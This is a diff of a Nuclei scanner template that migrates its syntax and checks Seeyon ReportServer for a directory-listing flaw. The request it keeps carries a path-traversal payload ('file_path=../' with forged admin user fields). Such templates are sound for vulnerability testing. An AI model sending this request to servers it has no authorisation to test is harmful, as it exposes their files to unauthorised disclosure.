@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: Seeyou-ReportServer-Directory-Shipping
 
 info:
@@ -9,7 +10,7 @@ info:
     - https://github.com/coldrainh
   tags: Seeyou,ReportServer-Directory Shipping
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true'
@@ -18,7 +19,7 @@ requests:
       Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
       Pragma: no-cache
       Cache-Control: no-cache
-      
+
 
     matchers-condition: and
     matchers:
